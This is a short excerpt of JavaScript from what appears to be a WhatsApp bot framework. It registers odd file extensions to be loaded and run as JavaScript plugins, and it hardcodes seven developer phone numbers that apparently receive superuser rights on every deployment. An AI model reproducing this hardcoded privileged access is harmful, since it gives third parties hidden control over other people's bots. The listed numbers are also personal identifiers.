...
const { evt, commands } = require('../core/commands');
const { standardizeJid } = require('../socket/serializer');
const { getGroupMetadata, getLidMapping } = require('../socket/cache');
...
require.extensions['.INCONNU XD']  = _compileAsJs;
require.extensions['.ke']      = _compileAsJs;

const _pluginExts = new Set(['.js', '.gmd', '.kasongo', '.amd', '.INCONNU XD', '.ke']);
...
const buildSuperUsers = async (settings, getSudoNumbers, botId, ownerNumber) => {
    const devNumbers = ('254715206562,554488138425,254114018035,254728782591,254799916673,254762016957,254113174209')
        .split(',')
